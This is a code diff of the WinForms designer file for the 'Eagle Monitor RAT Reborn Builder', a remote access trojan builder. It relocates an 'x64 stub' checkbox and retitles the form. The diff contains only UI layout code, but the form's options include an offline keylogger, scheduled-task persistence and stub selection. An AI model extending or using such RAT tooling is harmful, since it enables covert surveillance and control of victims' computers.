@@ -40,6 +40,7 @@
             this.label1 = new System.Windows.Forms.Label();
             this.dnsGuna2TextBox = new Guna.UI2.WinForms.Guna2TextBox();
             this.guna2GroupBox2 = new Guna.UI2.WinForms.Guna2GroupBox();
+            this.x64StubGuna2CheckBox = new Guna.UI2.WinForms.Guna2CheckBox();
             this.vbStubGuna2CheckBox = new Guna.UI2.WinForms.Guna2CheckBox();
             this.offKeyloguna2CheckBox = new Guna.UI2.WinForms.Guna2CheckBox();
             this.taskNameGuna2TextBox = new Guna.UI2.WinForms.Guna2TextBox();
@@ -48,7 +49,6 @@
             this.timeTaskGuna2TextBox = new Guna.UI2.WinForms.Guna2TextBox();
             this.label4 = new System.Windows.Forms.Label();
             this.buildGuna2Button = new Guna.UI2.WinForms.Guna2Button();
-            this.x64StubGuna2CheckBox = new Guna.UI2.WinForms.Guna2CheckBox();
             this.guna2GroupBox1.SuspendLayout();
             this.guna2GroupBox2.SuspendLayout();
             this.SuspendLayout();
@@ -264,6 +264,24 @@
             this.guna2GroupBox2.TabIndex = 17;
             this.guna2GroupBox2.Text = "Miscellaneous";
             // 
+            // x64StubGuna2CheckBox
+            // 
+            this.x64StubGuna2CheckBox.AutoSize = true;
+            this.x64StubGuna2CheckBox.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
+            this.x64StubGuna2CheckBox.CheckedState.BorderRadius = 0;
+            this.x64StubGuna2CheckBox.CheckedState.BorderThickness = 0;
+            this.x64StubGuna2CheckBox.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
+            this.x64StubGuna2CheckBox.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(230)))), ((int)(((byte)(230)))), ((int)(((byte)(230)))));
+            this.x64StubGuna2CheckBox.Location = new System.Drawing.Point(343, 53);
+            this.x64StubGuna2CheckBox.Name = "x64StubGuna2CheckBox";
+            this.x64StubGuna2CheckBox.Size = new System.Drawing.Size(70, 19);
+            this.x64StubGuna2CheckBox.TabIndex = 22;
+            this.x64StubGuna2CheckBox.Text = "x64 stub";
+            this.x64StubGuna2CheckBox.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
+            this.x64StubGuna2CheckBox.UncheckedState.BorderRadius = 0;
+            this.x64StubGuna2CheckBox.UncheckedState.BorderThickness = 0;
+            this.x64StubGuna2CheckBox.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
+            // 
             // vbStubGuna2CheckBox
             // 
             this.vbStubGuna2CheckBox.AutoSize = true;
@@ -413,24 +431,6 @@
             this.buildGuna2Button.Text = "Build !";
             this.buildGuna2Button.Click += new System.EventHandler(this.buildGuna2Button_Click);
             // 
-            // x64StubGuna2CheckBox
-            // 
-            this.x64StubGuna2CheckBox.AutoSize = true;
-            this.x64StubGuna2CheckBox.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
-            this.x64StubGuna2CheckBox.CheckedState.BorderRadius = 0;
-            this.x64StubGuna2CheckBox.CheckedState.BorderThickness = 0;
-            this.x64StubGuna2CheckBox.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
-            this.x64StubGuna2CheckBox.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(230)))), ((int)(((byte)(230)))), ((int)(((byte)(230)))));
-            this.x64StubGuna2CheckBox.Location = new System.Drawing.Point(343, 53);
-            this.x64StubGuna2CheckBox.Name = "x64StubGuna2CheckBox";
-            this.x64StubGuna2CheckBox.Size = new System.Drawing.Size(70, 19);
-            this.x64StubGuna2CheckBox.TabIndex = 22;
-            this.x64StubGuna2CheckBox.Text = "x64 stub";
-            this.x64StubGuna2CheckBox.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
-            this.x64StubGuna2CheckBox.UncheckedState.BorderRadius = 0;
-            this.x64StubGuna2CheckBox.UncheckedState.BorderThickness = 0;
-            this.x64StubGuna2CheckBox.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
-            // 
             // Main
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
@@ -448,7 +448,7 @@
             this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
             this.Name = "Main";
             this.Padding = new System.Windows.Forms.Padding(3, 32, 3, 3);
-            this.Text = "Form1";
+            this.Text = "Eagle Monitor RAT Reborn Builder";
             this.Load += new System.EventHandler(this.Main_Load);
             this.guna2GroupBox1.ResumeLayout(false);
             this.guna2GroupBox2.ResumeLayout(false);
